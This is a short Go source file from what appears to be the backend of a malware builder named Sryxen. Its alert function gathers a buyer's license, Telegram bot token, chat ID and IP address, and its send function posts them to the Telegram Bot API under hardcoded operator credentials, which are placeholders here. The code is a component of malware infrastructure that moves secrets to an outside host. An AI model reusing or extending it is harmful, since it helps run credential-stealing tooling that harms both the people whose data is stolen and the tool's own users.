package alerts

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"sryxen_backend/structs"
	"strings"
)

const (
	TelegramBotToken string = "SIG"
	TelegramChatID   string = "MA"
)

func BuildAlert(license, botToken, chatID, ipAddress string) {
	var data strings.Builder

	data.WriteString("Sryxen Build Alert\n")
	data.WriteString(fmt.Sprintf("License: %s\n", license))
	data.WriteString(fmt.Sprintf("Bot Token: %s\n", botToken))
	data.WriteString(fmt.Sprintf("Chat ID: %s\n", chatID))
	data.WriteString(fmt.Sprintf("IP Address: %s\n", ipAddress))
	sendMessage(data.String())
}

func sendMessage(text string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TelegramBotToken)

	message := structs.TelegramRequest{
		ChatID: TelegramChatID,
		Text:   text,
	}

	jsonData, err := json.Marshal(message)
	if err != nil {
		return fmt.Errorf("failed to marshal message: %v", err)
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send message: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to send message, status code: %d", resp.StatusCode)
	}

	return nil
}
